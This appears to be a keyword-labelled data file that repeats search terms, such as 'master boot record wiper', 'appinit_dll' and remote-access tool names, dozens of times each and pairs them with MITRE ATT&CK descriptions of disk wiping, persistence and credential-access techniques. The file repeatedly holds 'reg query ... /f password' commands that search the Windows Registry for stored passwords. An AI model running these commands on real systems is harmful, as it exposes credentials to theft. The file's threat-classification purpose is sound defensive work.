ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) 

Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
overwrite or delete MBR in same sentence 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
  master boot record wiper 
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
 MBR + overwrite/wipe
Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. 

Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.

To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
reg query HKLM /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
 reg query HKCU /f password /t REG_SZ /s 
Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)

* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
appinit_dll
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)

Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. 

The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
SQL inject
Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). 

If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.

For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
Team Viewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 TeamViewer 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 VNC 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Ammy 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 Go2Assist 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 LogMeing 
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
 AmmyAdmin
An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.(Citation: Symantec Living off the Land)

Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).

Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
msiexec, odbcconf
Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager 
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
 AppCertDLL
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. 
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
winlogon
